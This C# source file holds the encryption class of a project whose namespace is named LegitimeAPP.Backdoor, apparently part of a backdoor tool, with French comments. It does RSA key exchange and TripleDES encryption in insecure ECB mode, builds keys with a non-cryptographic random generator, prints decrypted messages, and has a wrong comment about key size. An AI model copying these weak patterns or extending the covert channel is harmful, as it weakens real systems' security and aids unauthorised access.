using System ;
using System.Text ; 
using System.Security.Cryptography ;
using LegitimeAPP.Shared ; 

namespace LegitimeAPP.Backdoor {


    /*
    D'abord le client envoie sa clé publique au serveur puis
    le serveur encrypt la clé symétrique qu'il envoie au client 
    c'est comme ça que le chiffrement s'opére 
    */
    public class Encryption {


        private RSACryptoServiceProvider _rsa ;

        private string _symmetricKey ; 

        public Encryption() {

            // Crée la pair des clés pour chiffrement asymétrique 
            _rsa = new RSACryptoServiceProvider(8192) ;

            // Soit 8192 bit soit 1024 bytes soit  128 caractères  car 1 caractères est codé sur un octet


            _symmetricKey = String.Empty ; 


          //  _rsa.Padding = PaddingMode.None ;            

        }

        public string SymmetricKey {
            get {
                return _symmetricKey ; 
            }
            set {
                _symmetricKey = value ;
            }
        }
 
        public string GetPublicKey {
            get {
                return _rsa.ToXmlString(false) ;  
            }
        }

        /**
        Symétrique encryption
        */


        public static string Encrypt(string input, string key)  
        {  
            byte[] inputArray = UTF8Encoding.UTF8.GetBytes(input);  
            TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider();  
            tripleDES.Key = UTF8Encoding.UTF8.GetBytes(key);  
            tripleDES.Mode = CipherMode.ECB;  
            tripleDES.Padding = PaddingMode.PKCS7;  
            ICryptoTransform cTransform = tripleDES.CreateEncryptor();  
            byte[] resultArray = cTransform.TransformFinalBlock(inputArray, 0, inputArray.Length);  
            tripleDES.Clear();  
            return Convert.ToBase64String(resultArray, 0, resultArray.Length);  
        }  
        public static string Decrypt(string input, string key)  
        {  
            byte[] inputArray = Convert.FromBase64String(input);  
            TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider();  
            tripleDES.Key = UTF8Encoding.UTF8.GetBytes(key);  
            tripleDES.Mode = CipherMode.ECB;  
            tripleDES.Padding = PaddingMode.PKCS7;  
            ICryptoTransform cTransform = tripleDES.CreateDecryptor();  
            byte[] resultArray = cTransform.TransformFinalBlock(inputArray, 0, inputArray.Length);  
            tripleDES.Clear();   
            return UTF8Encoding.UTF8.GetString(resultArray);  
        }

        public static string GenerateSymKey() {
            int length = 24 ;
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }





        #region assymetric

        public string Decrypt( byte[] mess ) {

            Console.WriteLine("ce que je veux : "+mess.Count()) ; 

            byte[] decryptedBytes = _rsa.Decrypt(mess, false);
            string decryptedText = Encoding.Default.GetString(decryptedBytes);

            Console.WriteLine("Message déchiffré  :"+decryptedText) ; 

            return decryptedText;
        }

        #endregion
    }
}

